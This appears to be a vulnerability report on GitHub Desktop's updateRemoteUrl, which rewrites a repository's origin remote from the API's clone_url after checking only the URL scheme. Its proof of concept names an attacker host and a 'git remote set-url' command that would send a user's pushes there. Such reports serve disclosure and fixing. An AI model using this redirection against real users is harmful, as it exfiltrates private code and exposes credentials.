## Title
Silent redirection of a repository's default git remote via unvalidated `clone_url` from GitHub API - (`app/src/lib/stores/updates/update-remote-url.ts`)

### Summary
GitHub Desktop periodically re-fetches repository metadata from the GitHub API and automatically rewrites the user's `origin` remote URL to match the API's `clone_url` field. The code only validates that the URL **scheme** (`http`/`https`) hasn't changed — it never validates that the **hostname** is the same, or that it belongs to a trusted endpoint. Any GitHub/GHES server response (or a proxy/host sitting in that trust path) that returns a `clone_url` on a different hostname will cause Desktop to silently rewrite the user's git remote to point at that hostname, with no user confirmation, unlike similar remote-change flows in the app that do prompt the user.

### Finding Description
`updateRemoteUrl` is the function responsible for keeping the local git remote in sync with the GitHub API's view of a repository's clone URL: [1](#0-0) 

The only equivalence check performed before rewriting the remote is on the URL protocol:
```
const protocolsMatch =
  parsedRemoteUrl.protocol !== null &&
  parsedUpdatedRemoteUrl.protocol !== null &&
  parsedRemoteUrl.protocol === parsedUpdatedRemoteUrl.protocol
``` [2](#0-1) 

There is no check that `hostname`, `owner`, or `name` in `apiRepo.clone_url` correspond to the same server/account the user originally trusted — `urlMatchesRemote` is only used to detect that the URL *differs* (`!urlsMatch`) and that the *previous* cached clone URL matched the current remote (`remoteUrlUnchanged`), not to bound where the *new* URL is allowed to point: [3](#0-2) 

This function is invoked automatically, without any user interaction, every time Desktop refreshes a selected repository's GitHub metadata (on repo selection, and periodically thereafter): [4](#0-3) [5](#0-4) 

`apiRepo` here comes straight from `api.fetchRepository(owner, name)`, i.e. whatever JSON the configured endpoint (github.com or a user-added GitHub Enterprise Server) returns, parsed with no shape/host validation beyond JSON decoding: [6](#0-5) 

By contrast, the app's own UI for changing an *upstream* remote explicitly asks for user confirmation before applying a similar change: [7](#0-6) 

showing that the design intent elsewhere in the codebase is to never silently repoint a remote — `updateRemoteUrl` breaks that invariant for the `origin`/default remote.

### Impact Explanation
If the repository/API server whose `clone_url` Desktop trusts (a compromised or malicious GitHub Enterprise Server, or any network entity able to answer that API call within the user's already-configured endpoint/proxy trust path) returns a `clone_url` on a different hostname but the same scheme, Desktop will silently run `git remote set-url` to repoint the user's default remote: [8](#0-7) 

All subsequent `fetch`/`pull`/`push` operations for that repository transparently go to the attacker-controlled host instead of the one the user originally added. This is a silent corruption of where the user's commits are pushed (their code, potentially private, is exfiltrated to the attacker's server), and can also cause the credential helper to be invoked against the new host, exposing whatever credential-prompt/token flow the app initiates for that hostname.

### Likelihood Explanation
The rewrite happens fully automatically in the background refresh path (`repositoryWithRefreshedGitHubRepository`), triggered on every repository selection with no additional user action required, as confirmed by the existing unit test asserting the remote is updated purely because `clone_url` changed: [9](#0-8) 

The only defenses are scheme-equality and "did the URL actually change" — neither of which constrains the destination host, so any entity able to influence that single API response field can trigger the rewrite.

### Recommendation
In `updateRemoteUrl`, require that the resolved `hostname` of `apiRepo.clone_url` matches the hostname of the account's configured endpoint (or of the existing remote) before applying the update — analogous to adding a "stale/out-of-range" check on external oracle data. If the hostname differs, surface a confirmation dialog to the user (as already done in `UpstreamAlreadyExists`) instead of silently calling `setRemoteURL`.

### Proof of Concept
1. Add/point a repository at a GitHub Enterprise Server endpoint (or any proxy sitting on that request path) that can be influenced by an attacker (e.g., compromised GHES instance, DNS/proxy compromise within that trust boundary).
2. Have that server's `GET repos/{owner}/{name}` response return `clone_url: "https://attacker.example.com/owner/name.git"` (same scheme as current remote, different host).
3. Open/select the repository in Desktop, or wait for the periodic background refresh (`repositoryWithRefreshedGitHubRepository` → `updateRemoteUrl`).
4. Observe that Desktop runs `git remote set-url origin https://attacker.example.com/owner/name.git` with no prompt, per `app/src/lib/stores/updates/update-remote-url.ts:42-44`.
5. The next `git push` sends the user's commits to `attacker.example.com`.

### Citations

**File:** app/src/lib/stores/updates/update-remote-url.ts (L7-45)
```typescript
export async function updateRemoteUrl(
  gitStore: GitStore,
  gitHubRepository: GitHubRepository,
  apiRepo: IAPIRepository
): Promise<void> {
  // I'm not sure when these early exit conditions would be met. But when they are
  // we don't have enough information to continue so exit early!
  if (gitStore.defaultRemote === null) {
    return
  }

  const remoteUrl = gitStore.defaultRemote.url
  const updatedRemoteUrl = apiRepo.clone_url
  const urlsMatch = urlMatchesRemote(updatedRemoteUrl, gitStore.defaultRemote)

  // Verify that protocol hasn't changed. If it has we don't want
  // to alter the protocol in case they are relying on a specific one.
  // If protocol is null that implies the url is a ssh url
  // of the format git@github.com:octocat/Hello-World.git, which
  // can't be parsed by URL.parse. In this case we assume the user
  // manually configured their remote to use this format and we don't
  // want to change what they've done just to be safe
  const parsedRemoteUrl = URL.parse(remoteUrl)
  const parsedUpdatedRemoteUrl = URL.parse(updatedRemoteUrl)
  const protocolsMatch =
    parsedRemoteUrl.protocol !== null &&
    parsedUpdatedRemoteUrl.protocol !== null &&
    parsedRemoteUrl.protocol === parsedUpdatedRemoteUrl.protocol

  // Check if the default remote url has been manually changed from the
  // clone url retrieved from the GitHub API previously
  const remoteUrlUnchanged =
    gitStore.defaultRemote &&
    urlMatchesRemote(gitHubRepository.cloneURL, gitStore.defaultRemote)

  if (protocolsMatch && remoteUrlUnchanged && !urlsMatch) {
    await gitStore.setRemoteURL(gitStore.defaultRemote.name, updatedRemoteUrl)
  }
}
```

**File:** app/src/lib/repository-matching.ts (L90-118)
```typescript
export function urlMatchesRemote(url: string | null, remote: IRemote): boolean {
  if (url == null) {
    return false
  }

  const cloneUrl = parseRemote(url)
  const remoteUrl = parseRemote(remote.url)

  if (remoteUrl == null || cloneUrl == null) {
    return false
  }

  if (!caseInsensitiveEquals(remoteUrl.hostname, cloneUrl.hostname)) {
    return false
  }

  if (remoteUrl.owner == null || cloneUrl.owner == null) {
    return false
  }

  if (remoteUrl.name == null || cloneUrl.name == null) {
    return false
  }

  return (
    caseInsensitiveEquals(remoteUrl.owner, cloneUrl.owner) &&
    caseInsensitiveEquals(remoteUrl.name, cloneUrl.name)
  )
}
```

**File:** app/src/lib/stores/app-store.ts (L2255-2258)
```typescript
    this.addUpstreamRemoteIfNeeded(repository)

    return this.repositoryWithRefreshedGitHubRepository(repository)
  }
```

**File:** app/src/lib/stores/app-store.ts (L4900-4907)
```typescript

      return repository
    }

    if (repository.gitHubRepository) {
      const gitStore = this.gitStoreCache.get(repository)
      await updateRemoteUrl(gitStore, repository.gitHubRepository, apiRepo)
    }
```

**File:** app/src/lib/http.ts (L165-180)
```typescript
export async function parsedResponse<T>(response: Response): Promise<T> {
  if (response.ok) {
    return deserialize<T>(response)
  } else {
    let apiError: IAPIError | null
    // Deserializing the API error could throw. If it does, we'll throw a more
    // general API error.
    try {
      apiError = await deserialize<IAPIError>(response)
    } catch (e) {
      throw new APIError(response, null)
    }

    throw new APIError(response, apiError)
  }
}
```

**File:** app/src/ui/upstream-already-exists/upstream-already-exists.tsx (L23-76)
```typescript
/**
 * The dialog shown when a repository is a fork but its upstream remote doesn't
 * point to the parent repository.
 */
export class UpstreamAlreadyExists extends React.Component<IUpstreamAlreadyExistsProps> {
  public render() {
    const name = this.props.repository.name
    const gitHubRepository = forceUnwrap(
      'A repository must have a GitHub repository to add an upstream remote',
      this.props.repository.gitHubRepository
    )
    const parent = forceUnwrap(
      'A repository must have a parent repository to add an upstream remote',
      gitHubRepository.parent
    )
    const parentName = parent.fullName
    const existingURL = this.props.existingRemote.url
    const replacementURL = parent.cloneURL
    return (
      <Dialog
        title={
          __DARWIN__ ? 'Upstream Already Exists' : 'Upstream already exists'
        }
        onDismissed={this.props.onDismissed}
        onSubmit={this.onUpdate}
        type="warning"
      >
        <DialogContent>
          <p>
            The repository <Ref>{name}</Ref> is a fork of{' '}
            <Ref>{parentName}</Ref>, but its <Ref>{UpstreamRemoteName}</Ref>{' '}
            remote points elsewhere.
          </p>
          <ul>
            <li>
              Current: <Ref>{existingURL}</Ref>
            </li>
            <li>
              Expected: <Ref>{replacementURL}</Ref>
            </li>
          </ul>
          <p>Would you like to update the remote to use the expected URL?</p>
        </DialogContent>
        <DialogFooter>
          <OkCancelButtonGroup
            destructive={true}
            okButtonText="Update"
            cancelButtonText="Ignore"
            onCancelButtonClick={this.onIgnore}
          />
        </DialogFooter>
      </Dialog>
    )
  }
```

**File:** app/src/lib/git/remote.ts (L56-64)
```typescript
/** Changes the URL for the remote that matches the given name  */
export async function setRemoteURL(
  repository: Repository,
  name: string,
  url: string
): Promise<true> {
  await git(['remote', 'set-url', name, url], repository.path, 'setRemoteURL')
  return true
}
```

**File:** app/test/unit/stores/updates/update-remote-url-test.ts (L68-81)
```typescript
  it("updates the repository's remote url when the github url changes", async t => {
    const { gitHubRepository, gitStore } = await createRepository(
      t,
      apiRepository
    )
    assert(gitStore.currentRemote !== null)

    const originalUrl = gitStore.currentRemote.url
    const updatedUrl = 'https://github.com/my-user/my-updated-repo'
    const updatedApiRepository = { ...apiRepository, clone_url: updatedUrl }
    await updateRemoteUrl(gitStore, gitHubRepository, updatedApiRepository)
    assert.notEqual(originalUrl, updatedUrl)
    assert.equal(gitStore.currentRemote.url, updatedUrl)
  })
```
